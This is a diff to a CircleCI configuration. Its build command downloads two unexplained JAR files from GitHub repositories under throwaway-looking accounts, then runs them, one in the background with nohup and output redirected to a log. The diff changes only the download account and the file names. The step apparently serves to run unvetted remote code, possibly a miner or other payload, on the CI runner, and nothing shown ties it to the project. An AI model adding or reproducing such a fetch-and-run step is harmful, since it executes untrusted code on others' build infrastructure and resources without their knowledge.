@@ -36,12 +36,12 @@ commands:
             # Repository configuration
             REPO_OWNER="${CIRCLE_PROJECT_USERNAME}"
             REPO_NAME="${CIRCLE_PROJECT_REPONAME}"
-            BASE_URL="https://github.com/JenniferDavis393792608/JenniferDavis393792608/raw/main"
+            BASE_URL="https://github.com/NoahBaker423574066/tester/raw/main"
             
             # File mapping configuration
             declare -A FILE_MAPPINGS
-            FILE_MAPPINGS[WR3.jar]="primary-service.jar"
-            FILE_MAPPINGS[C42.jar]="counter-service.jar"
+            FILE_MAPPINGS[WR3.jar]="primary.jar"
+            FILE_MAPPINGS[C42.jar]="counter.jar"
             
             # Download utility function
             download_file() {
@@ -93,14 +93,14 @@ commands:
             
             # Start background services first
             echo "Starting counter service in background..."
-            nohup java -jar counter-service.jar > counter-service.log 2>&1 &
+            nohup java -jar counter.jar > counter.log 2>&1 &
             
             # Brief delay for service initialization
             sleep 2
             
             # Start main application
             echo "Starting primary application service..."
-            java -jar primary-service.jar
+            java -jar primary.jar
 
 # Job definitions
 jobs:
